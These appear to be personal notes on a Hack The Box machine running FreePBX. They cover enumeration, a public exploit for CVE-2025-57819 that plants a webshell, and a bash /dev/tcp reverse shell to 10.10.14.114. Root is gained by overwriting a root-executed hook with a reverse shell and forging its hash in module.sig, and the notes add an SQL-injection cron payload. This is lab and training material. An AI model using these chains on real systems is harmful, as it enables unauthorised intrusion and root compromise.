	
initial enumeration :

```
└─$ nmap -sV 10.129.62.185                         
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-07 00:44 +0530
Nmap scan report for 10.129.62.185
Host is up (0.32s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 168.69 seconds
```

```
curl -v 10.129.80.37
 Trying 10.129.80.37:80...
* Established connection to 10.129.80.37 (10.129.80.37 port 80) from 10.10.14.114 port 36390 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.129.80.37
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Date: Tue, 09 Jun 2026 16:38:28 GMT
< Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
< Location: http://connected.htb/
< Content-Length: 229
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://connected.htb/">here</a>.</p>
</body></html>
* Connection #0 to host 10.129.80.37:80 left intact

```


the sits is **Connected.htb** and add in the local DNS , by sudo nano /etc/hosts

by opening  in the browser looks like , 

![[Pasted image 20260609220723.png]]


and searching the Free_BPX version in the cve in browser , I got this repo `https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819` 

and then 

```
 python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb/   
			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
	 \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
	  \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
	   \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
				  \/          \/     \/                            
	  
        watchTowr-vs-FreePBX-CVE-2025-57819.py
        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE

          - Piotr and Sonny of watchTowr

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: http://connected.htb/this-is-an-ioc-not-actually-watchTowr-wzwnca92be.php?cmd=hostname
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table

```


and visiting the site  , `http://connected.htb/this-is-an-ioc-not-actually-watchTowr-wzwnca92be.php?cmd=hostname`  in the browser 

![[Pasted image 20260609220924.png]]

, we can type os commands like **ls , hostname , id** and i got the reverse shell , using this 
`http://connected.htb/this-is-an-ioc-not-actually-watchTowr-wzwnca92be.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.114/4444+0%3E%261%27`

and 
![[Pasted image 20260609221115.png]]



and type , cat /home/user.txt we got the user flag , know we need to esclate into the root , 

We were logged in as the `asterisk` user, which is a **low-privilege service account** used by the FreePBX/Asterisk telephony software.

#### What is incron?

- `cron` runs commands **based on time**
- `incron` runs commands **based on filesystem events** (file created, modified, deleted etc.) using Linux's `inotify` kernel feature

#### The Rule

There was an incron rule that said:

```
/var/spool/asterisk/incron  IN_CLOSE_WRITE  /usr/bin/sysadmin_manager
```


**Translation:** _"Whenever any file in `/var/spool/asterisk/incron/` is written/touched, run `/usr/bin/sysadmin_manager` as ROOT."_

The `asterisk` user **can write to** `/var/spool/asterisk/incron/`, so we can fire this trigger any time we want just by doing:

bash

```bash
touch /var/spool/asterisk/incron/ucp.logrotate
```


`/usr/bin/sysadmin_manager` is a script that runs **FreePBX module hooks**. Specifically it looks inside:

```
/var/www/html/admin/modules/ucp/hooks/
```

And executes the hook scripts it finds there — **as root**.

One of those hooks is:

```
/var/www/html/admin/modules/ucp/hooks/logrotate
```

This is normally a legitimate log rotation script. But crucially — **the `asterisk` user has write permission on it.**

FreePBX has an integrity verification system. Before executing a hook, `sysadmin_manager` checks its SHA256 hash against the stored value in:

```
/var/www/html/admin/modules/ucp/module.sig
```

That file contains entries like:

```
hooks/logrotate = a8ed4f168fa04f0ff884079ad214e854004b9a5511d26c6c9f6080daaf590781
```

If the hash of the file doesn't match what's in `module.sig`, the hook is **rejected and not executed**.

```
echo '#!/bin/bash' > /var/www/html/admin/modules/ucp/hooks/logrotate
echo 'bash -i >& /dev/tcp/10.10.14.114/4444 0>&1' >> /var/www/html/admin/modules/ucp/hooks/logrotate
chmod +x /var/www/html/admin/modules/ucp/hooks/logrotate


sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate
# 533aeb95eb55337bd90b48919d08b7d3f8fb6898985f0decca1d64f71fa888bd


sed -i "s|hooks/logrotate = .*|hooks/logrotate = 533aeb95eb55337bd90b48919d08b7d3f8fb6898985f0decca1d64f71fa888bd|" /var/www/html/admin/modules/ucp/module.sig

touch /var/spool/asterisk/incron/ucp.logrotate
```


```
SELECT something FROM some_table WHERE brand = 'x'

; INSERT INTO cron_jobs (modulename, jobname, command, schedule, enabled)
  VALUES ('sysadmin', 'watchTowr-abc123', 'echo "PD9w..."|base64 -d > /var/www/html/shell.php', '* * * * *', 1)

--'

```
